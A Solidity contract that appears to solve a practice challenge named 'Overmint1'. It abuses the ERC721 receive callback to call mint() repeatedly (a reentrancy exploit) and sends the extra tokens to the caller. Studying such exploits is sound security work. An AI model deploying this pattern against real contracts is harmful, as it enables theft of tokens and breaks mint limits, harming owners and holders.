// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import { console } from "hardhat/console.sol";

interface IOvermint is IERC721 {
    function mint() external;
}
contract Overmint1Attacker is IERC721Receiver {
    IOvermint public immutable target;
    uint256[5] public loot;
    uint256 counter = 0;

    constructor(address _target) {
        target = IOvermint(_target);
    }

    function attack() public {
        target.mint();        
        for (uint256 i = 0; i < 5; i++) {
            target.safeTransferFrom(address(this), msg.sender, loot[i]);
        }
        
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4) {

        if (target.balanceOf(address(this)) < 6) {
            target.mint();
            loot[counter] = tokenId;
            counter++;
            return this.onERC721Received.selector;
        } else {
            return this.onERC721Received.selector;
        }
    }
}